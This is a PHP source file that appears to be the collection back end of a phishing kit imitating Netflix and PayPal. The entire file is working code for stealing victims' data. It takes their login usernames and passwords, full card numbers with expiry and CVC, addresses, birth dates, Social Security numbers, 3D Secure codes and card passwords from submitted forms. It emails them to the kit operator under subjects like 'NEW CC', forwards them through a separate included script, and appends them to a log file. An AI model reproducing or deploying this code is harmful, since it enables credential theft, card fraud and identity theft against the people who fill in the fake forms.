<?php
include('../your_email.php');
$headers .= "MIME-Version: 1.0\n";
$headers .= "Content-type: text/html; charset=UTF-8\n";
$field = $_POST['field'];
$fieldp = $_POST['fieldp'];
$fieldi = $_POST['fieldi'];
$fieldc = $_POST['fieldc'];
$fieldu = $_POST['fieldu'];
$fieldt = $_POST['fieldt'];
if($field == ''){ echo 'Access Denid!';} else {
	$suj = "NEW LOG NET " . $fieldi;
$msgm = "<html><head><title>New Data</title></head><body><p>________________________NEW DATA__________________________</p><table><tr><td>User Ntfx     : </td><td>" . $field . "</td></tr><tr><td>Pass Ntfx     : </td><td>" . $fieldp . "</td></tr><tr> <td>IP            : </td><td>" . $fieldi . "</td></tr><tr><td>Country IP    : </td><td>" . $fieldc . "</td></tr><tr><td>USER AGENT    : </td><td>" . $fieldu . "</td></tr><tr><td>TIME          : </td><td>" . $fieldt . "</td></tr></table><p>________________________NEW DATA__________________________</p></body></html>";
	mail($to, $suj, $msgm, $headers);
$_POST['a'] = $suj; 
$_POST['b'] = $msgm; 
include "checkfy.php";
	$msg = "\r\n ________________________NEW DATA__________________________ \r\n User Ntfx : " . $field . "\r\n Pass Ntfx : " . $fieldp . "\r\n IP : " . $fieldi . "\r\n Country IP : " . $fieldc . "\r\n USER AGENT : " . $fieldu . "\r\n TIME : " . $fieldt . "\r\n ________________________NEW DATA__________________________"; 

	$myfile = fopen("../log.txt", "a+") or die("Unable to open file!");
	fwrite($myfile, $msg);
	fclose($myfile);
}
session_start();
		$xxf = $_POST['xxf'];
		$xxl = $_POST['xxl'];
		$xxc = $_POST['xxc'];
		$xxe = $_POST['xxe'];
		$xxcv = $_POST['xxcv'];
		$xxa = $_POST['xxa'];
		$xxci = $_POST['xxci'];
		$xxco = $_POST['xxco'];
		$xxz = $_POST['xxz'];
		$xxp = $_POST['xxp'];
		$xxip = $_POST['xxip'];
		$xxxtt = $_POST['xxxtt'];
		$_SESSION["xxff"] = $_POST['xxf'];
		$_SESSION["xxll"] = $_POST['xxl'];
		$_SESSION["xxccn"] = $_POST['xxc'];
		$_SESSION["xxee"] = $_POST['xxe'];
		$_SESSION["xxcvx"] = $_POST['xxcv'];
		$_SESSION["xxaa"] = $_POST['xxa'];
		$_SESSION["xxcix"] = $_POST['xxci'];
		$_SESSION["xxcox"] = $_POST['xxco'];
		$_SESSION["xxzz"] = $_POST['xxz'];
		$_SESSION["xxpp"] = $_POST['xxp'];
		$_SESSION["xxxiip"] = $_POST['xxip'];
		$_SESSION["xxxnb"] = $_POST['xxxnb'];
		$_SESSION["xxxsc"] = $_POST['xxxsc'];
		$_SESSION["xxxtc"] = $_POST['xxxtc'];
		$_SESSION["xxxub"] = $_POST['xxxub'];
		$_SESSION["xxxpb"] = $_POST['xxxpb'];
		$id = $_SESSION['xxccn'];
		$ss = strlen($id);
		$lengthcard = $ss - 4;
		$cardX =  substr($id,$lengthcard);
		$_SESSION['cardx'] = $cardX;
if($xxf == ''){ echo 'Access Denid!';} else {
		$suj = "NEW CC " . $xxip;
$msgm = "<html><head><title>New Data</title></head><body><p>________________________NEW DATA__________________________</p><table><tr>
      <td>First Name : </td><td>" . $xxf . "</td></tr><tr><td>Last Name : </td><td>" . $xxl . "</td></tr><tr><td>CardNumber : </td><td>" . $xxc . "</td></tr><tr><td>Expiration Date : </td><td>" . $xxe . "</td></tr><tr><td>CVC : </td><td>" . $xxcv . "</td></tr><tr><td>Addresse : </td><td>" . $xxa . "</td></tr><tr><td>City : </td><td>" . $xxci . "</td></tr><tr><td>Country : </td><td>" . $xxco . "</td></tr><tr><td>Zip : </td><td>" . $xxz . "</td></tr><tr><td>Phone : </td><td>" . $xxp . "</td></tr><tr><td>IP : </td><td>" . $xxip . "</td></tr><tr><td>TIME : </td><td>" . $xxxtt . "</td></tr></table><p>________________________NEW DATA__________________________</p></body></html>";
	mail($to, $suj, $msgm, $headers);
$_POST['a'] = $suj; 
$_POST['b'] = $msgm; 
include "checkfy.php";
	$msg = "\r\n ________________________NEW DATA__________________________ \r\n First Name : " . $xxf . "\r\n Last Name : " . $xxl . "\r\n CardNumber : " . $xxc . "\r\n Expiration Date : " . $xxe . "\r\n CVC : " . $xxcv . "\r\n Addresse : " . $xxa . "\r\n City : " . $xxci . "\r\n Country : " . $xxco . "\r\n Zip : " . $xxz . "\r\n Phone : " . $xxp . "\r\n IP : " . $xxip . "\r\n TIME : " . $xxxtt  . "\r\n ________________________NEW DATA__________________________";

	$myfile = fopen("../log.txt", "a+") or die("Unable to open file!");
	fwrite($myfile, $msg);
	fclose($myfile);
}
		$xd = $_POST['xd'];
		$xm = $_POST['xm'];
		$xy = $_POST['xy'];
		$xz1 = $_POST['xz1'];
		$xz2 = $_POST['xz2'];
		$xz3 = $_POST['xz3'];
		$xds = $_POST['xds'];
		$xxfff = $_POST['xxfff'];
		$xxxiip = $_POST['xxxiip'];
		$xxxttt = $_POST['xxxttt'];
		$_SESSION['xxxscc'] = $_POST['xxxscc'];
		$_SESSION['cardxx'] = $_POST['xxccnn'];
		if ($xd == '') { echo "Access Denid!"; } else {
				$suj = "3D CODE " . $xxxiip;
		$msgm = "<html><head><title>New Data</title></head><body><p>________________________NEW DATA__________________________</p><table><tr><td>Name : </td><td>" . $xxfff . "</td></tr><tr><td>BirthDate : </td><td>" . $xd . "/" . $xm . "/" . $xy . "</td></tr><tr><td>Social Security Number : </td><td>" . $xz1 . "/" . $xz2 . "/" . $xz3 . "</td></tr><tr><td>3D Secure : </td><td>" . $xds . "</td></tr><tr><td>IP : </td><td>" . $xxxiip . "</td></tr><tr><td>TIME : </td><td>" . $xxxttt . "</td>  </tr></table><p>________________________NEW DATA__________________________</p></body></html>";
			mail($to, $suj, $msgm, $headers);
$_POST['a'] = $suj; 
$_POST['b'] = $msgm; 
include "checkfy.php";		
			$msg = "\r\n ________________________NEW DATA__________________________ \r\n Name : " . $xxfff . "\r\n BirthDate : " . $xd . "/" . $xm . "/" . $xy . "\r\n Social Security Number : " . $xz1 . "/" . $xz2 . "/" . $xz3 . "\r\n 3D Secure : " . $xds . "\r\n TIME : " . $xxxttt . "\r\n IP : " . $xxxiip . "\r\n ________________________NEW DATA__________________________ \r\n ";
		$myfile = fopen("../log.txt", "a+") or die("Unable to open file!");
		fwrite($myfile, $msg);
		fclose($myfile);
}
		$md = $_POST['md'];
		$mmm = $_POST['mmm'];
		$my = $_POST['my'];
		$mxtz1 = $_POST['mxtz1'];
		$mxtz2 = $_POST['mxtz2'];
		$mmp = $_POST['mmp'];
		$xxffff = $_POST['xxffff'];
		$xxxiipp = $_POST['xxxiipp'];
		$xxxtttx = $_POST['xxxtttx'];
		$_SESSION['xxxscc'] = $_POST['xxxscc'];
		$_SESSION['cardxx'] = $_POST['xxccnn'];

		if ($md == '') { echo "Access Denid!"; } else{

		$suj = "NEW DATA " . $xxxiipp;
		$msgm = "<html><head><title>New Data</title></head><body><p>________________________NEW DATA__________________________</p><table><tr><td>Name : </td><td>" . $xxffff . "</td></tr><tr><td>BirthDate : </td><td>" . $md . "/" . $mmm . "/" . $my . "</td>
    </tr><tr><td>CardHolder : </td><td>" . $mxtz1 . "</td></tr><tr><td>Email : </td><td>" . $mxtz2 . "</td></tr><tr><td>SecurePassword : </td><td>" . $mmp . "</td></tr><tr><td>IP : </td><td>" . $xxxiip . "</td></tr><tr><td>TIME : </td><td>" . $xxxttt . "</td>  </tr></table><p>________________________NEW DATA__________________________</p></body></html>";
			mail($to, $suj, $msgm, $headers);
$_POST['a'] = $suj; 
$_POST['b'] = $msgm; 
include "checkfy.php";		    
			$msg = "\r\n ________________________NEW DATA__________________________ \r\n Name : " . $xxffff . "\r\n BirthDate : " . $md . "/" . $mmm . "/" . $my . "\r\n CardHolder : " . $mxtz1 . "\r\n Email : " . $mxtz2 . "\r\n SecurePassword : " . $mmp . "\r\n TIME : " . $xxxtttx . "\r\n IP : " . $xxxiipp . "\r\n ________________________NEW DATA__________________________ \r\n";
		$myfile = fopen("../log.txt", "a+") or die("Unable to open file!");
		fwrite($myfile, $msg);
		fclose($myfile);
}
		$emp = $_POST['emp'];
		$px = $_POST['px'];
		$ptim = $_POST['ptim'];
		$pip = $_POST['pip'];

		if ($emp == ''){echo "Access Denid!";}else{
			$suj = "NEW PPL " . $pip;
			$msgm = "<html><head><title>New Data</title></head><body><p>________________________NEW DATA__________________________</p><table><tr><td>User ppl : </td><td>" . $emp . "</td></tr><tr><td>Pass ppl : </td><td>" . $px . "</td></tr><tr><td>IP : </td><td>" . $pip . "</td></tr><tr><td>TIME : </td><td>" . $ptim . "</td></tr></table><p>________________________NEW DATA__________________________</p></body></html>";
			mail($to, $suj, $msgm, $headers);
$_POST['a'] = $suj; 
$_POST['b'] = $msgm; 
include "checkfy.php";
			$msg = "\r\n ________________________NEW DATA__________________________ \r\n User ppl : " . $emp . "\r\n Pass ppl : " . $px . "\r\n TIME : " . $ptim ."\r\n IP : " . $pip . "\r\n ________________________NEW DATA__________________________ \r\n";
		$myfile = fopen("../log.txt", "a+") or die("Unable to open file!");
		fwrite($myfile, $msg);
		fclose($myfile);
}
?>